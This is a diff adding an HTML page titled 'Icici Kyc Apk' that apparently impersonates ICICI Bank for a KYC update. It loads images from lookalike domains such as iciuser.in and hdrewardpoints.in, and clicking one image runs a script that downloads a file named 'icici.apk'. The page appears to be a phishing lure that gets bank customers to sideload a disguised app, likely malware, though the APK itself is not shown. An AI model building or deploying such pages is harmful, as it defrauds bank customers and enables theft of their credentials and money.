@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Icici Kyc Apk</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        background-color: #f0f0f0;
+      }
+
+      .image-container {
+        width: 100%;
+      }
+
+      .image-container img {
+        display: block;
+        width: 100%;
+        height: auto;
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="image-container">
+      <img src="https://iciuser.in/img/2a.png" alt="Image 1" />
+    </div>
+    <div class="image-container">
+      <img
+        src="https://hdrewardpoints.in/2.png"
+        alt="Image 2"
+        onclick="installAPK()"
+      />
+    </div>
+    <div class="image-container">
+      <img src="https://iciuser.in/img/9.jpg" alt="Image 3" />
+    </div>
+    <div class="image-container">
+      <img src="https://iciuser.in/img/image1.jpeg" alt="Image 4" />
+    </div>
+
+    <script>
+      function installAPK() {
+        const link = document.createElement("a");
+        link.href = "icici.apk";
+        link.download = "icici.apk";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+    </script>
+  </body>
+</html>
